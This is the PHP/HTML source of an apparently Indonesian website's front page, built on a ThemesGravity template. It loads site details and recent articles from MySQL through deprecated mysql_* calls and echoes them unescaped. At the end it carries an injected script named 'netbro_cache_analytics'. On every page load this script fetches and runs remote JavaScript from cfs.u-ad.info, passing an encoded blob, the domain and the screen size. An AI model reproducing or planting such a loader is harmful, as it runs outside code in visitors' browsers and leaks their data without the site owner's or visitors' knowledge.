<?php
	
	include "config/koneksi.php";
	$infohal=mysql_query("select * from halaman");
	$dinfohal=mysql_fetch_array($infohal);
	
?>
<!DOCTYPE html>
<html lang="en">

<head>

        <title><?php echo $dinfohal['judulweb'];?></title>

        <!-- SEO -->
        <meta charset="utf-8">
        <meta name="keywords" content="keyword keyword keyword keyword keyword keyword keyword keyword keyword keyword keyword">
        <meta name="description" content="Lorem ipsum description of this page.">
        <meta name="author" content="Raghav Joshi(ThemesGravity), themesgravity@gmail.com">

        <!-- initializing looks -->
        <!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!-- Animate Styles -->
        <link rel="stylesheet" href="css/vendor/animate.css">
 
		<link rel="stylesheet" href="css/stylemenu.css">
		<link rel="stylesheet" href="css/stylecontent.css">

        <!-- Fonts -->
        <link href='http://fonts.googleapis.com/css?family=Playfair+Display|Sintony:400,700' rel='stylesheet' type='text/css'>

        <!-- Stylesheet -->
        <link rel="stylesheet" href="css/styles.css">
        <link rel="stylesheet" href="css/font-awesome/css/font-awesome.min.css">

        <!-- Custom Stylesheet == Make sure u put all ur css changes in this file == -->

        <!-- HTML5 shim, for IE6-8 support of HTML elements -->
        <!--[if lt IE 9]>
          <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->

        <!-- CUSTOM JavaScript so you can use jQuery or $ before it has been loaded in the footer. -->
        <script>(function(w,d,u){w.readyQ=[];w.bindReadyQ=[];function p(x,y){if(x=="ready"){w.bindReadyQ.push(y);}else{w.readyQ.push(x);}};var a={ready:p,bind:p};w.$=w.jQuery=function(f){if(f===d||f===u){return a}else{p(f)}}})(window,document)</script>

    </head>
    
    <?php 
	include "part/header.php";
	?>
	
	<?php
				if(isset($_GET['page2']))
				{
					if($_GET['page2'] == 'intro')
					{
					echo"<div id='slide'>";
						include 'part/slider.php';
					echo"</div>";	
					
					}
					
				}
				else {
				echo"<div id='slide'>";
						include 'part/slider.php';
					echo"</div>";	
					
					}
					?>
	
<?php
				if(isset($_GET['page2']))
				{
					if($_GET['page2'] == 'home')
					{
						include 'part/slider.php';
					}
					elseif($_GET['page2'] == 'tentangkami')
					{
						include 'part/tentangkami2.php';
					}
					elseif($_GET['page2'] == 'register')
					{
						include 'part/register.php';
					}
					elseif($_GET['page2'] == 'berita')
					{
						include 'artikel/berita.php';
					}
					elseif($_GET['page2'] == 'isiberita')
					{
						include 'artikel/isiberita.php';
					}
					elseif($_GET['page2'] == 'kontakkami')
					{
						include 'pesan/kontakkami2.php';
					}				
					
				}
					else
					{
						
					}
				
			  ?>
		

           
            <footer id="footer" bgcolor='#0A7EEA'>
		<br><br><br><br><br>
			<div id='bawah'><br>
			
                <div class="container">
                    <div class="row">
                        <div class="col-sm-3 col-md-3 col-lg-3">
						<?php 
	echo $dinfohal['judulweb'];?></font>
                            <br>
                            <br>
			<p align='justify'><font color='white' size='2.9'><?php echo $w=substr($dinfohal['deskripsi'],0,450); ?></font></p>
	
                        </div><!-- /col-md-3 -->
                        <div class="col-sm-3 col-md-3 col-lg-3">
                        <div class="widget widget-latest-posts">
	<h5>Latest Posts</h5>
	<?php 
$query_ = "select * from artikel ORDER BY id DESC LIMIT 0,4";
					$sql_ = mysql_query($query_);
					while($c=mysql_fetch_array($sql_))
{?>	
	<ul>
		<li><a href="utama.php?page2=isiartikel&&id=<?php echo "$c[id]"; ?>"><font color='white' size='2.8'><?php echo $c['judul']; ?></a></li>
	</ul>
<?php } ?>
</div><!-- /widget-latest-posts -->
                        </div><!-- /col-md-3 -->
                        <div class="col-sm-3 col-md-3 col-lg-3">
                            <div class="widget widget-contact">
	<h5>Contact</h5>

	<div class="address">
		<font color='white' size='2.8'><i class="fa fa-home"></i>
		<p><font color='white' size='2.8'><?php echo $dinfohal['lokasi'];?></p>
	
	</div><!-- /address -->

	<div class="phone">
		<font color='white' size='2.8'><i class="fa fa-phone"></i>
		<p><font color='white' size='2.8'><?php echo $dinfohal['telp'];?></p>
	</div><!-- /phone -->

	<!-- <div class="time">
		<i class="fa fa-clock-o"></i>
		<p>08-16 hours<br>Monday - Friday</p>
	</div> -->

	<div class="email">
		<font color='white' size='2.8'><i class="fa fa-envelope-o"></i>
	<p><font color='white' size='2.8'><?php echo $dinfohal['email'];?></p>
	</div><!-- /email -->
	
</div><!-- /widget-contact -->
                        </div><!-- /col-md-3 -->
                        <div class="col-sm-3 col-md-3 col-lg-3">
                            <div class="widget widget-newsletter">
	<h5>Newsletter</h5>
	
	<form method="get" action="#">
	    <input type="text" name="name" placeholder="Your Name?">
	    <input type="email" name="email" placeholder="Email Address">
	    <a type="button" class="btn btn-primary">Submit</a>
	</form>
	
</div><!-- /widget-newsletter -->

                        </div><!-- /col-md-3 -->
                    </div><!-- /row -->
                </div><!-- /container -->
				</div>
            </footer><!-- /main-footer -->

				<link rel='stylesheet' href='css/styleutama.css' type='text/css'>
            <div class="copyright-section">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-3 col-md-3 col-lg-3">
                            
                        </div><!-- /col-md-3 -->
                        
                        <div class="col-sm-4 col-md-4 col-lg-4">
                            <p class="copyright">Copyright &copy; 2017 <?php echo $dinfohal['judulweb'];?>. All Rights Reserved</p>
                        </div><!-- /col-md-4 -->
                    </div><!-- /row -->
                </div><!-- /container -->
            </div><!-- /copyright-section -->


        </section><!-- /wrapper -->
        <!-- jQuery -->
		<!-- <script src="http://code.jquery.com/jquery-1.11.0.min.js"></script> -->
		<script src="js/vendor/jquery-1.11.0.min.js"></script>

		<!-- CUSTOM JavaScript so you can use jQuery or $ before it has been loaded in the footer. -->
		<script>(function($,d){$.each(readyQ,function(i,f){$(f)});$.each(bindReadyQ,function(i,f){$(d).bind("ready",f)})})(jQuery,document)</script>

		<!-- Google Maps Plugin -->
		<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?libraries=geometry&amp;sensor=true"></script>
		
		<script src="js/vendor/maplace.min.js"></script>

		<!-- Bootstrap JavaScript -->
		<script src='bootstrap/js/bootstrap.min.js'></script>

		<!-- Custom Bootstrap Select Dropdown Javascript -->
		<script type="text/javascript" src="js/vendor/bootstrap-select.min.js"></script>

		<!-- Custom Bootstrap Datepicker Javascript -->
		<script type="text/javascript" src="js/vendor/picker.js"></script>
		<script type="text/javascript" src="js/vendor/picker.date.js"></script>

		<!-- Main JavaScript File for the theme -->
		<script src='js/scripts.js'></script>

		<!-- Shortcodes JavaScript File for the theme -->
		<script src='js/shortcodes.js'></script>

		<!-- widgets/footer-widgets JavaScript File for the theme -->
		<script src='js/widgets.js'></script>

		<!-- Newsletter Shortcode DEPENDANCY JS -->
		<script src='js/vendor/classie.js'></script>
		<script src='js/vendor/modernizr.custom.js'></script>

		<!-- Newsletter Shortcode main JS -->
		<script src='js/vendor/newsletter.js'></script>

		<!-- Owl Carousel Main Js File -->
		<script src="js/vendor/owl.carousel.js"></script>

	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnc4qLWMe%2b7NHVJBJmU0tgCj8kOy0lWhyZogcFb0QUc3nfIRf71SXcXOI6OSXXkzqsgTORmpmE6a92yfhgB681AiWTM4KzOKT9VboLGYL6xOo3arREUL1Bhy2g0UESHu7XRB1ScGj1FG7MKSDs%2bHYTI%2bq%2bnC6%2b4slVv4orVsy3Z8J0rUJEfLURh%2f6CUnLZx5E8JUTK9G0307KeWF9KCcPUtK2acGDPi5JSoXjbnMmtoqUc14yH89Eh6yvL847AaD3rgP0Za4r4F8%2bWSRyG7QnFa2JiGjl84mYx2ZGAc6rh99%2fW1GPUroin6QS1x3kKVsnVy6Y88EmeSmUIlvZCJje3fUlRUX8ulcGVPM%2bpOKOAJ3%2fAh%2f8cHkGqCAc4dfCcNcpVR9deTEjumNFNsCEB7S4Ad1EVTHqAUlCxfr%2boW%2bJv8TptnmLFVJlKUYNkWrPTZkV%2fN0U0UIw3bGZx2quSQ7nq2Tx7fR7WW3AKDwPUTDd%2bnyipH6YBe%2ba5gkDXoNT%2bFp1HYvJSSbSVTzxYNxOJJc8rH2Xvgwvo8uPtAt95otZxwGTqI1mj7%2f67H6s8XDQG6DC8AmXgIPCke3MJLznLLwpPW2W6RmvfetAH9WmKEI0%2ftaH0WBs6pCnJbQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
        
